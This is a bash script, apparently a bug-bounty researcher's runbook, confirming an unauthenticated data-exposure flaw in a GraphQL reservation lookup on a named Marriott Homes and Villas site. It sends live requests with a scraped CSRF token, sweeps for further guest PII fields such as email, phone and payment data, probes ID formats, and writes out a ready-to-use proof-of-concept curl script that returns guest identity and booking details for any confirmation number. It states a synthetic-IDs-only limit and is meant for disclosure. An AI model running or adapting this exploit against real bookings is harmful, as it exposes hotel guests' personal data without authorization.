#!/usr/bin/env bash
# =============================================================================
# Marriott — HnV reservationDetails BOLA: confirm + evidence pack (session44)
# Portable: Linux / Pi / Termux.
#
# Confirmed so far: reservationDetails(confirmation_id: ID!) runs UNAUTH (CSRF
# only) and exposes guest_first_name, guest_last_name, check_in_date,
# check_out_date, number_of_guests, property_name, total, currency.
#
# This run finalizes the case for the report:
#   A. Clean reproducible PoC: full-field query with a SYNTHETIC id -> shows the
#      resolver executes with no auth and returns the object (fields null for a
#      non-matching id). Capture verbatim request+response for the report.
#   B. Second-factor check: is there a last_name/email arg (would make it a
#      guarded lookup, not a pure IDOR)? Probe optional args.
#   C. Exhaustive field sweep (more PII candidates: email/phone/address/payment).
#   D. confirmation_id format/validation behavior (no real values) for the
#      enumerability/severity argument.
#
# SAFETY: SYNTHETIC confirmation ids ONLY. No real confirmation numbers, no
# third-party PII. Read-only, no mutations. Stop if any real data appears.
#
# Run (Termux): OUTDIR=$HOME/s44 bash runbooks/PI-RUNBOOK-session44-hnv-bola-confirm.sh \
#                 2>&1 | tee $HOME/s44/s44.log
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s44
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s44"
  else OUTDIR="$HOME/s44"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
IDH='X-Bug-Bounty: hackerone-researcher'
T="homes-and-villas.marriott.com"; B="https://$T"; JAR="$OUTDIR/jar.txt"
SYN="ZZTEST-0000-0000-NOTREAL"

echo "============================================================"
echo "HNV BOLA CONFIRM  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Work: $OUTDIR   synthetic id: $SYN"
echo "============================================================"; echo ""

curl -s -o "$OUTDIR/home.html" -c "$JAR" -H "User-Agent: $UA" -H "$IDH" --max-time 25 "$B/" >/dev/null || true
TOK=$(grep -oE 'id="sourceid"[^>]*data-source="[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*data-source="([^"]+)".*/\1/')
[ -z "$TOK" ] && TOK=$(grep -oE '"csrfToken":"[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*:"([^"]+)"/\1/')
echo "csrf token: ${TOK:0:30}..."; echo ""

gq() { curl -s -o "$OUTDIR/$2.json" -b "$JAR" -H "User-Agent: $UA" -H "$IDH" \
  -H 'Content-Type: application/json' -H 'Accept: application/json' \
  -H "Origin: $B" -H "Referer: $B/" -H "x-hvmi-csrf-token: $TOK" \
  --max-time 20 --data "$1" -w '%{http_code}|%{size_download}' "$B/gateway/graphql" 2>/dev/null || echo "000|0"; }

echo "═══ PHASE A: CLEAN REPRODUCIBLE PoC (full fields, synthetic id, NO auth) ═══"
PoC='{"query":"query R($c:ID!){reservationDetails(confirmation_id:$c){guest_first_name guest_last_name property_name check_in_date check_out_date number_of_guests total currency}}","variables":{"c":"ZZTEST-0000-0000-NOTREAL"}}'
m=$(gq "$PoC" a-poc)
echo "  -> ${m%|*} | ${m#*|}B"
echo "  RESPONSE: $(cat "$OUTDIR/a-poc.json")"
echo ""
echo "  Verbatim PoC (no session cookie, only CSRF token) saved to poc-curl.sh:"
cat > "$OUTDIR/poc-curl.sh" << CURL
# 1) get a fresh csrf token (public homepage, no auth)
TOK=\$(curl -s https://$T/ | grep -oE 'id="sourceid"[^>]*data-source="[^"]+"' | head -1 | sed -E 's/.*data-source="([^"]+)".*/\1/')
# 2) call the GraphQL gateway UNAUTHENTICATED with only the CSRF token
curl -s 'https://$T/gateway/graphql' \\
  -H 'content-type: application/json' \\
  -H "x-hvmi-csrf-token: \$TOK" \\
  --data '{"query":"query R(\$c:ID!){reservationDetails(confirmation_id:\$c){guest_first_name guest_last_name property_name check_in_date check_out_date number_of_guests total currency}}","variables":{"c":"<CONFIRMATION_ID>"}}'
CURL
sed 's/^/    /' "$OUTDIR/poc-curl.sh"
echo ""

echo "═══ PHASE B: SECOND-FACTOR / ARG CHECK (is last_name/email required?) ═══"
for A in 'last_name:"X"' 'guest_last_name:"X"' 'email:"x@x.com"' 'lastName:"X"' 'surname:"X"'; do
  AN="${A%%:*}"
  m=$(gq "{\"query\":\"query R(\$c:ID!){reservationDetails(confirmation_id:\$c, $A){__typename}}\",\"variables\":{\"c\":\"$SYN\"}}" "b-$AN")
  b=$(cat "$OUTDIR/b-$AN.json")
  if echo "$b" | grep -q "Unknown argument"; then echo "  $AN -> NOT an arg (no second factor)"
  else echo "  $AN -> accepted? :: $(echo "$b"|head -c 120|tr '\n' ' ')"; fi
  sleep 0.3
done
echo ""

echo "═══ PHASE C: EXHAUSTIVE PII FIELD SWEEP ═══"
for F in guest_email guest_phone guest_phone_number email email_address phone \
         phone_number mobile mobile_number contact_email guest_address address \
         street_address city state country postal_code zip_code payment \
         payment_method card_last4 last_four amount_paid payment_status \
         reservation_status booking_status status property_address property_id \
         listing_id unit_name room_type host_name host_email loyalty_id member_id \
         confirmation_number itinerary_id booking_id; do
  m=$(gq "{\"query\":\"query R(\$c:ID!){reservationDetails(confirmation_id:\$c){$F}}\",\"variables\":{\"c\":\"$SYN\"}}" "c-$F")
  b=$(cat "$OUTDIR/c-$F.json")
  echo "$b" | grep -q "Cannot query field" || { echo "$b" | grep -qi "must have a selection" && echo "  OBJECT  $F" || echo "  PRESENT $F"; }
  sleep 0.25
done
echo ""

echo "═══ PHASE D: confirmation_id FORMAT BEHAVIOR (synthetic formats only) ═══"
for FMT in "12345678" "0000000000" "ABCDEF12" "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee" "1" "TEST"; do
  m=$(gq "{\"query\":\"query R(\$c:ID!){reservationDetails(confirmation_id:\$c){guest_first_name}}\",\"variables\":{\"c\":\"$FMT\"}}" "d-$(echo "$FMT"|tr -c A-Za-z0-9 _)")
  echo "  fmt[$FMT] -> ${m%|*}|${m#*|}B :: $(cat "$OUTDIR/d-$(echo "$FMT"|tr -c A-Za-z0-9 _).json"|head -c 90|tr '\n' ' ')"
  sleep 0.3
done
echo "  (all synthetic — none are real. We do NOT enumerate real numbers.)"
echo ""

echo "════════════════════════════════════════════"
echo "CASE SUMMARY"
echo "════════════════════════════════════════════"
python3 - << 'PYEOF'
import os,glob
O=os.environ["OUTDIR"]
present=set()
for f in glob.glob(os.path.join(O,"c-*.json")):
    b=open(f).read()
    if "Cannot query field" not in b: present.add(os.path.basename(f)[2:-5])
base=["guest_first_name","guest_last_name","property_name","check_in_date","check_out_date","number_of_guests","total","currency"]
allf=sorted(set(base)|present)
pii=[x for x in allf if any(k in x for k in ("name","email","phone","address","card","payment","mobile","postal","zip","loyalty","member"))]
# second factor?
sf=True
for a in ("last_name","guest_last_name","email","lastName","surname"):
    p=os.path.join(O,f"b-{a}.json")
    if os.path.exists(p) and "Unknown argument" not in open(p).read(): sf=False
print("  Exposed fields (unauth, confirmation_id only):")
for x in allf: print("    -",x)
print(f"\n  PII fields: {pii}")
print(f"  Second factor (last_name/email) required: {'NO -> pure IDOR' if sf else 'maybe (an arg was accepted - check Phase B)'}")
print()
print("  => Unauthenticated BOLA: guest identity + reservation details via")
print("     confirmation_id alone, no login. Severity High (Critical if confirmation")
print("     numbers are low-entropy/enumerable). Evidence: poc-curl.sh + a-poc.json.")
print()
print("  PoC GAP: a-poc.json used a SYNTHETIC id (fields null). The undeniable demo")
print("  is ONE confirmation_id you legitimately hold (your own HnV booking) queried")
print("  logged-out -> real PII. We will NOT pull strangers' data.")
PYEOF
echo ""
echo "Evidence: $OUTDIR   (report PoC: $OUTDIR/poc-curl.sh)"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
